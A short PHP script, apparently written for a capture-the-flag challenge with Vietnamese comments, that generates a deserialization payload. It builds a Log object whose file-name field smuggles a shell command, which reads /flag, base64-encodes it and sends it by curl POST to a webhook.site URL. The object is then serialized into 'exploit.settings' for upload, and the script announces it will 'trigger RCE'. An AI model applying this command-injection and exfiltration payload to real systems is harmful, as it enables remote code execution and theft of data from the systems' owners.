<?php

namespace App\Models;

class Log
{
    public $logPath;
    public $logFile;

    public function __construct($logPath, $logFile)
    {
        $this->logPath = $logPath;
        $this->logFile = $logFile;
    }
}

$maliciousLog = new Log(
    '/var/www/html/storage/logs',
     'application.log; curl -X POST https://webhook.site/2a8dbb58-aff2-4766-a9a2-91906830e160 -d "$(cat /flag| base64 -w0)"; #'
);

// Serialize đối tượng để tạo payload
$serializedPayload = serialize($maliciousLog);

// Lưu payload vào file (dùng để upload)
file_put_contents('exploit.settings', $serializedPayload);

echo "Payload generated: exploit.settings\nUpload this file to trigger RCE.";
